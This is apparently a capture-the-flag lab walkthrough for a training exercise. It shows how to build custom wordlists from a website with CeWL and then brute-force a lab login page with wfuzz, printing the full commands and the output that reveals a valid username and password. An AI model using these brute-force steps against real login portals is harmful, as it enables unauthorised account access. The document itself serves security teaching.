To generate a basic wordlist from a website, use the following command:

Terminal
user@tryhackme$ cewl http://10.10.131.43                                     
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Start
End
and
the
AntarctiCrafts
[--snip--]
To save the wordlist generated to a file, you can use the command below:

Terminal
user@tryhackme$ cewl http://10.10.131.43 -w output.txt
user@tryhackme$ ls
output.txt
Why CeWL?
CeWL is a wordlist generator that is unique compared to other tools available. While many tools rely on pre-defined lists or common dictionary attacks, CeWL creates custom wordlists based on web page content. Here's why CeWL stands out:

Target-specific wordlists: CeWL crafts wordlists specifically from the content of a targeted website. This means that the generated list is inherently tailored to the vocabulary and terminology used on that site. Such custom lists can increase the efficiency of brute-forcing tasks.
Depth of search: CeWL can spider a website to a specified depth, thereby extracting words from not just one page but also from linked pages up to the set depth.
Customisable outputs: CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This level of customisation can be advantageous for targeting specific types of credentials or vulnerabilities.
Built-in features: While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
Efficiency: Given its customisability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
Integration with other tools: Being command-line based, CeWL can be integrated seamlessly into automated workflows, and its outputs can be directly fed into other cyber security tools.
Actively maintained: CeWL is actively maintained and updated. This means it stays relevant and compatible with contemporary security needs and challenges.
In conclusion, while there are many wordlist generators out there, CeWL offers a distinct approach by crafting lists based on a target's own content. This can often provide a strategic edge in penetration testing scenarios.

How To Customise the Output for Specific Tasks
CeWL provides a lot of options that allow you to tailor the wordlist to your needs:

Specify spidering depth: The -d option allows you to set how deep CeWL should spider. For example, to spider two links deep: cewl http://10.10.131.43 -d 2 -w output1.txt
Set minimum and maximum word length: Use the -m and -x options respectively. For instance, to get words between 5 and 10 characters: cewl http://10.10.131.43 -m 5 -x 10 -w output2.txt
Handle authentication: If the target site is behind a login, you can use the -a flag for form-based authentication.
Custom extensions: The --with-numbers option will append numbers to words, and using --extension allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
Follow external links: By default, CeWL doesn't spider external sites, but using the --offsite option allows you to do so.
Blue elf
Practical Challenge
To put our theoretical knowledge into practice, we'll attempt to gain access to the portal located at http://10.10.131.43/login.php

Your goal for this task is to find a valid login credential in the login portal. You might want to follow the step-by-step tutorial below as a guide.

Create a password list using CeWL: Use the AntarctiCrafts homepage to generate a wordlist that could potentially hold the key to the portal.
Terminal
user@tryhackme$ cewl -d 2 -m 5 -w passwords.txt http://10.10.131.43 --with-numbers
user@tryhackme$ cat passwords.txt
telephone
support
Image
Professional
Stuffs
Ready
Business
Isaias
Security

Create a username list using CeWL: Use the AntarctiCrafts' Team Members page to generate a wordlist that could potentially contain the usernames of the employees.
Terminal
user@tryhackme$ cewl -d 0 -m 5 -w usernames.txt http://10.10.131.43/team.php --lowercase
user@tryhackme$ cat usernames.txt
start
antarcticrafts
stylesheet
about
contact



Brute-force the login portal using wfuzz: With your wordlist ready and the list of usernames from the Team Members page, it's time to test the login portal. Use wfuzz to brute-force the /login.php.
What is wfuzz? Wfuzz is a tool designed for brute-forcing web applications. It can be used to find resources not linked directories, servlets, scripts, etc, brute-force GET and POST parameters for checking different kinds of injections (SQL, XSS, LDAP), brute-force forms.


root@ip-10-10-147-169:~# wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.131.43/login.php -d "username=FUZZ&password=FUZ2Z"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.131.43/login.php
Total requests: 9361

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

006317:  C=302    118 L	     297 W	   4442 Ch	  "isaias - Happiness"

Total time: 23.34701
Processed Requests: 9361
Filtered Requests: 9360
Requests/sec.: 400.9505

